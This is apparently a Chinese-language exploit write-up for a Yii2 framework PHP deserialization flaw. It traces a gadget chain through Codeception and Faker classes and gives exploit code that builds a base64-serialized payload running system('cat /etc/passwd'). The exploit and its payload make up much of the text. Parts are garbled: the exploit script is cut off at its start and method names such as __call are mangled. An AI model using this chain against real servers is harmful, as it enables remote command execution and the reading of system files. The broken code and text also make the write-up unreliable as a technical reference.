# Yii反序列化漏洞
### 0x搭建环境
首先利用composer安装yii2框架
`composer create-project yiisoft/yii2-app-basic yii2`
yii2 version processes可控 所以\$process可控,下文中if判断处isRunning()可用来触发
**call方法,在当前文件中我们没有找到`** wakeup`函数，证明这里是可以作为我们pop链的起点的。
### 2x call调用
以前大家都用`vendor/fakerphp/faker/src/Faker/Generator.php`来调用`$this->format`
官方在新版本也同样添加了`__wakeup()`做限制
    public function __wakeup()
        {
            $this->formatters = [];
        }
我们继续搜索 **call
发现`vendor/fakerphp/faker/src/Faker/ValidGenerator.php`的`**call`方法存在两处代码执行点，且没有`__wakeup`限制
这里`$this->generator,$this->validator,$this->maxRetries`三者可控
我们只需要给`$this->generator`找一个call返回可控字符串的对象就可以使$res返回值可控
do循环中的if判断可以直接把maxRetries设置为很大的数跳过Exception
接着`$this->validator`可控制 我们就可以执行任意命令了
### 3x 二重call
这里直接找到了一个Faker命名空间下的`vendor/fakerphp/faker/src/Faker/DefaultGenerator.php`
我们将`$this->default`设置为'cat /etc/passwd'
这样`vendor/fakerphp/faker/src/Faker/ValidGenerator.php`中
$this->generator为DefaultGenerator.php`
$name触发call
$arguments 无所谓的情况下
$res的结果将完全可控
    $res = call_user_func_array([$this->generator, $name], $arguments);
    // $res完全可控
### 4x exp:
    default = $argv;
            }
        }
        class ValidGenerator{
            protected $generator;
            protected $validator;
            protected $maxRetries;
            function __construct($command,$argv)
            {
                $this->generator = new DefaultGenerator($argv);
                $this->validator = $command;
                $this->maxRetries = 99999999;
            }
        }
    }
    namespace Codeception\Extension{
        use Faker\ValidGenerator;
        class RunProcess{
            private $processes = [] ;
            function __construct($command,$argv)
            {
                $this->processes[] = new ValidGenerator($command,$argv);
            }
        }
    }
    namespace {
        use Codeception\Extension\RunProcess;
        $exp = new RunProcess('system','cat /etc/passwd');
        echo(base64_encode(serialize($exp)));
        exit();
    }
    TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjE6e3M6NDM6IgBDb2RlY2VwdGlvblxFeHRlbnNpb25cUnVuUHJvY2VzcwBwcm9jZXNzZXMiO2E6MTp7aTowO086MjA6IkZha2VyXFZhbGlkR2VuZXJhdG9yIjozOntzOjEyOiIAKgBnZW5lcmF0b3IiO086MjI6IkZha2VyXERlZmF1bHRHZW5lcmF0b3IiOjE6e3M6MTA6IgAqAGRlZmF1bHQiO3M6MTU6ImNhdCAvZXRjL3Bhc3N3ZCI7fXM6MTI6IgAqAHZhbGlkYXRvciI7czo2OiJzeXN0ZW0iO3M6MTM6IgAqAG1heFJldHJpZXMiO2k6OTk5OTk5OTk7fX19